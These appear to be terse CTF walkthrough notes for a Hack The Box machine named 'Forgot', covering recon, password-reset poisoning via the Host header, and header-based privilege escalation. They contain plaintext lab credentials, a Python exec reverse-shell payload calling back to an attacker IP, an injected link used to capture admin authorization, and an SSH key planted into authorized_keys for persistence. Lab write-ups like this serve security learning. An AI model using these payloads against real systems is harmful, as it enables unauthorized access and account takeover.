## Forgot

Recon NMAP

default 1000 tcp scan open port result

22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Werkzeug/2.1.2 Python/3.8.10

Full port nmap scan no results

OS identified

Ubuntu Focal (20.04)

Endpoints

/logins 
/home {need basic authorization}
/forgot {username}
/reset {token for set new password}

a suspicious command from html source

<!-- Q1 release fix by robert-dev-14320 -->

user:robert-dev-14320

later check
https://www.cybersecurity-help.cz/vdb/SB2021080215

Host Header Injection

Password reset HOST header is vulnerable to password reset posiong attack
referacnce : https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning
logged in as robert-dev-14320

User to admin privilege escaltion

go to /admin_tickets and change the authorization username to admin

details from admin tickets

http://forgot.htb/tickets/102

i've tried with diego:dCb#1!x0%gjq. The automation tasks has been blocked due to this issue. Please resolve this at the earliest

Inject our link in the link parameter and setup a netcat listener. it reveal the admin authorization  

to=Admin&link=hTTP://10.10.16.9&reason=This is a test&issue=Getting error while accessing search feature in enterprise platform.

Shell as user 
creds:
diego:dCb#1!x0%gjq

from database app

admin | dCvbgFh345_368352c@! |
robert-dev-10023 | dCvf34@3#8(6 

'hello=exec("""\nimport socket\nimport
subprocess\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(("10.10.16.9",9001))\nsubprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())""")'

privileage escaltion
https://github.com/advisories/GHSA-75c9-jrh4-79mc

Payload 

hello=exec("""\nimport os\nos.system("id > /tmp/id.txt")""")


echo -n 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCyW32Y/+2kOKo7XRfIpdZsdLPfJaAWUB27jA94Z5QgRLcXadk+5Qsty9Fwj/SxNtum7CO/QPbC4KGJ2NIx3KR3Gik17fpsx672AvXs4UV77woC+gN+Z44GvbKGYpCL9E5bgOHAMh1ypfxva6UCkw+ZFG4OiYH3HFzYUcFkLUN4K0af13ltqa8MJiy62D3RWxhl2ZvLyzG15EvKmyZoLTrokAUW0pqXgGxCzf5HqCqe9V2n1kP/bFrGfxZoGdUx3BgSird+IGB2YmVS8cpjb/w59+sURVSSglg4B71E5uC3wJRKXBUqmPR9z287G9wBOD8rg5CzD/Inu7V0rKA3mDZbsSSGCvCPl3T5y7WcmBm8WkGK/WrGT6kEoQNDPQPA0GDw/lrmQMxsq1M2vTC6aFIDsPOHrh7rLAVyR1yD/9LLLKsVVehEMe6nJv22sKFHxb2CmiyX1wMjhI7vosqwoq4VIULd17Vn0F2nEZZXa9KXcsefXhK/ghPH2qnioNeDVSs= user@parrot' > authorized_keys

